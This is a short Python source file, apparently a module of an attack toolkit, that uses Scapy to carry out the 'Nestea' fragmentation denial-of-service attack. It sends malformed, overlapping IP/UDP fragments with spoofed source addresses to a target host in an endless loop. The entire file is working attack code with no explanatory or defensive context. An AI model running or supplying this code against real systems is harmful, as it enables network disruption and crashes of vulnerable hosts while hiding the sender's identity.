from scapy.all import *
from func.spoof_addr import spoof_addr
import traceback

def nestea(target,terminal):
    try:
        terminal.write('\n[+] Sending malformed UDP packet to '+target)
        while True:
            spoofaddr = spoof_addr(terminal=terminal)
            send(IP(dst=target,src=spoofaddr,id=42,flags='MF')/UDP()/('X'*10),verbose=0)
            send(IP(dst=target,src=spoofaddr,id=42,frag=48)/("X"*116),verbose=0)
            send(IP(dst=target,src=spoofaddr,id=42,flags='MF')/UDP()/('X'*224),verbose=0)
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
